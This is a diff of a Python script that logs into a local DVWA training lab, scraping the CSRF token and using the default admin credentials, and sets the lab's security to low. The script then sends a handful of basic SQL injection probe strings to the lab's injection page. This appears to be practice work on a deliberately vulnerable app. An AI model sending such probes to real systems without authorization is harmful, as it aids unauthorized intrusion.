@@ -1,15 +1,28 @@
 import requests
+from bs4 import BeautifulSoup
 
 s = requests.Session()
 
-# login
-s.post("http://localhost/DVWA/login.php", data={
+login_url = "http://localhost/DVWA/login.php"
+
+r = s.get(login_url)
+
+soup = BeautifulSoup(r.text, "html.parser")
+token = soup.find("input", {"name": "user_token"})["value"]
+
+print("[+] Token:", token)
+
+login_data = {
     "username": "admin",
     "password": "password",
-    "Login": "Login"
-})
+    "Login": "Login",
+    "user_token": token
+}
 
-# ustaw security LOW (mega ważne)
+r2 = s.post(login_url, data=login_data)
+
+print("[+] Login status:", r2.status_code)
+
 s.get("http://localhost/DVWA/security.php?security=low&seclev_submit=Submit")
 
 url = "http://localhost/DVWA/vulnerabilities/sqli/"
@@ -17,7 +30,6 @@ url = "http://localhost/DVWA/vulnerabilities/sqli/"
 payloads = ["1", "'", '"', "--", "'("]
 
 for payload in payloads:
-
     r = s.get(url, params={"id": payload})
 
     print("\nPayload:", payload)
